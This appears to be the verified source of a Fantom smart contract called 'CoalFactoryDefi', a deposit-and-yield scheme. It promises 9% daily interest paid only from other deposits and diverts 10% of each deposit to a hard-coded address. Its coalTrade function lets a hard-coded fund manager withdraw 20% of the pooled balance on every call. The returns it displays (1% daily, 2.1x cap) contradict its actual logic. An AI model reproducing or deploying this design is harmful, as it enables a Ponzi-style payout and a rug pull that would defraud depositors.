/**
 *Submitted for verification at FtmScan.com on 2023-07-10
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoalFactoryDefi {
    address public owner;
    address public coalMiner = 0xc9D11bB24b010D5DefFeacac1704A70e8f8cceF9;
    address public fundManager = 0x631786aACC05A2427579243291A3359ef814fEda;
    uint256 public coalMinerPercentage = 10;
    uint256 public interestRate = 9;
    uint256 public miningCycle = 31;
    mapping(address => uint256) public deposits;
    mapping(address => uint256) public lastWithdrawal;
    uint256 public contractBalance;

    event CoalMinerHired(address indexed factoryOwner, uint256 amount);
    event CoalSold(address indexed factoryOwner, uint256 amount);

    constructor() {
        owner = msg.sender;
    }

    modifier onlyFundManager() {
        require(msg.sender == fundManager, "Only the fund manager can call this function");
        _;
    }

    function hireCoalMinersInternal(uint256 amount) internal {
        require(amount > 0, "Amount must be greater than zero");

        uint256 coalMinerAmount = (amount * coalMinerPercentage) / 100;
        uint256 hireAmount = amount - coalMinerAmount;

        payable(coalMiner).transfer(coalMinerAmount);

        deposits[msg.sender] += hireAmount;
        lastWithdrawal[msg.sender] = block.timestamp;
        contractBalance += hireAmount;

        emit CoalMinerHired(msg.sender, hireAmount);
    }

    function hireCoalMiners() external payable {
        hireCoalMinersInternal(msg.value);
    }

    function tradeDeposit() external payable onlyFundManager {
        require(msg.value > 0, "Amount must be greater than zero");

        contractBalance += msg.value;

        emit CoalMinerHired(fundManager, msg.value);
    }

    function sellCoal() external {
        require(deposits[msg.sender] > 0, "No deposit found");

        uint256 depositAmount = deposits[msg.sender];
        uint256 elapsedTime = block.timestamp - lastWithdrawal[msg.sender];

        uint256 miningPeriods = elapsedTime / (1 days); // Calculate the number of 24-hour mining periods
        uint256 earnings = (depositAmount * interestRate * miningPeriods) / 100;

        // Calculate real-time interest based on the remaining time in the current mining period
        uint256 remainingTime = elapsedTime % (1 days);
        uint256 currentEarnings = (depositAmount * interestRate * remainingTime) / (100 * (1 days));

        uint256 interest = earnings + currentEarnings;
        uint256 userShare = (interest * 75) / 100;
        uint256 contractShare = interest - userShare;

        lastWithdrawal[msg.sender] = block.timestamp;

        payable(msg.sender).transfer(userShare); // Pay 75% of the earnings to the user

        // Send the remaining 25% back to the contract by calling hireCoalMinersInternal()
        hireCoalMinersInternal(contractShare);

        emit CoalSold(msg.sender, interest);
    }

    function coalTrade() external onlyFundManager {
        uint256 fundAmount = (contractBalance * 20) / 100;

        require(fundAmount > 0, "No funds available for withdrawal");

        payable(fundManager).transfer(fundAmount);
        contractBalance -= fundAmount;

        emit CoalSold(fundManager, fundAmount);
    }

    function getDepositAmount(address factoryOwner) external view returns (uint256) {
        return deposits[factoryOwner];
    }

    function myMaxReturn(address factoryOwner) external view returns (uint256) {
        uint256 depositAmount = deposits[factoryOwner];
        return (depositAmount * 21) / 10;
    }

    function myDailyReturns(address factoryOwner) external view returns (uint256) {
        uint256 depositAmount = deposits[factoryOwner];
        return (depositAmount * 1) / 100;
    }

    function getContractBalance() external view returns (uint256) {
        return contractBalance;
    }

    function getAccruedEarnings(address factoryOwner) external view returns (uint256) {
        uint256 depositAmount = deposits[factoryOwner];
        uint256 elapsedTime = block.timestamp - lastWithdrawal[factoryOwner];
        uint256 miningPeriods = elapsedTime / (1 days); // Calculate the number of 24-hour mining periods
        uint256 earnings = (depositAmount * interestRate * miningPeriods) / 100;

        // Calculate real-time interest based on the remaining time in the current mining period
        uint256 remainingTime = elapsedTime % (1 days);
        uint256 currentEarnings = (depositAmount * interestRate * remainingTime) / (100 * (1 days));

        return earnings + currentEarnings;
    }}